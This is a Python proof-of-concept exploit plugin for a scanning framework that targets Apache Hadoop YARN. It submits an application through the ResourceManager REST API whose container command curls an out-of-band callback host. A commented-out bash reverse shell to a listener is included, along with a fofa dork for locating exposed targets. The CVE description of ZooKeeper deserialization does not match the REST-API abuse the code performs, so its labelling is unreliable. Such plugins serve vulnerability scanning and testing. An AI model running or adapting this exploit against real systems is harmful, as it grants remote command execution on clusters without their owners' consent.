# coding:utf-8  
import requests
from lib.core.common import url_handle, get_random_ua, get_ceye_dns, verify_ceye_dns
from lib.core.poc import POCBase
# ...
import urllib3

urllib3.disable_warnings()


class POC(POCBase):
    _info = {
        "author": "jijue",  # POC作者
        "version": "1",  # POC版本，默认是1
        "CreateDate": "2022-01-01",  # POC创建时间
        "UpdateDate": "2022-01-01",  # POC创建时间
        "PocDesc": """
        略  
        """,  # POC描述，写更新描述，没有就不写

        "name": "Apache Hadoop反序列化漏洞(CVE-2021-25642)",  # 漏洞名称
        "VulnID": "CVE-2021-25642",  # 漏洞编号，以CVE为主，若无CVE，使用CNVD，若无CNVD，留空即可
        "AppName": "Apache Hadoop YARN",  # 漏洞应用名称
        "AppVersion": "",  # 漏洞应用版本
        "VulnDate": "2022-01-01",  # 漏洞公开的时间,不知道就写今天，格式：xxxx-xx-xx
        "VulnDesc": """
            Apache Hadoop是美国阿帕奇（Apache）基金会的一套开源的分布式系统基础架构。
            该产品能够对大量数据进行分布式处理，并具有高可靠性、高扩展性、高容错性等特点。
            
            Apache Hadoop YARN存在安全漏洞:
            该漏洞源于其CapacityScheduler可选地使用ZKConfigurationStore时，它将从ZooKeeper获取的数据反序列化而无需验证，
            导致能够访问ZooKeeper的攻击者可以以YARN用户的身份运行任意命令。
        """,  # 漏洞简要描述

        "fofa-dork": """
            app="APACHE-hadoop-YARN"
        """,  # fofa搜索语句
        "example": "",  # 存在漏洞的演示url，写一个就可以了
        "exp_img": "",  # 先不管
    }

    def _verify(self):
        """
        返回vuln

        存在漏洞：vuln = [True,html_source] # html_source就是页面源码  

        不存在漏洞：vuln = [False,""]
        """
        vuln = [False, ""]

        success, dns_flag = get_ceye_dns()
        if success == False:
            return [False, dns_flag]

        url0 = self.target + "/ws/v1/cluster/apps/new-application"  # url自己按需调整
        url1 = self.target + "/ws/v1/cluster/apps"  # url自己按需调整

        headers = {
            "User-Agent": get_random_ua(),
            "Connection": "close",
            # "Content-Type": "application/x-www-form-urlencoded",
        }

        try:
            """
            检测逻辑，漏洞存在则修改vuln值为True，漏洞不存在则不动
            """
            req0 = requests.post(url0, headers=headers, proxies=self.proxy, timeout=self.timeout, verify=False)
            if req0.status_code == 200 and "application/json" in req0.headers[
                "Content-Type"] and "application-id" in req0.text:

                app_id = req0.json()["application-id"]
                data1 = {
                    'application-id': app_id,
                    'application-name': 'get-shell',
                    'am-container-spec': {
                        'commands': {
                            # 'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,
                            "command": "/bin/bash -c \"curl http://" + dns_flag + "/\""
                        },
                    },
                    'application-type': 'YARN',
                }
                req1 = requests.post(url1, json=data1, headers=headers, proxies=self.proxy, timeout=self.timeout,
                                     verify=False)
                flager = verify_ceye_dns(dns_flag)

                if flager == True:
                    vuln = [True, dns_flag]
                elif flager == False:
                    vuln = [False, dns_flag]
                else:
                    vuln = [False, flager]
            else:
                vuln = [False, req0.text]
        except Exception as e:
            raise e

        # 以下逻辑酌情使用
        if self._honeypot_check(vuln[1]) == True:
            vuln[0] = False

        return vuln

    def _attack(self):
        return self._verify()
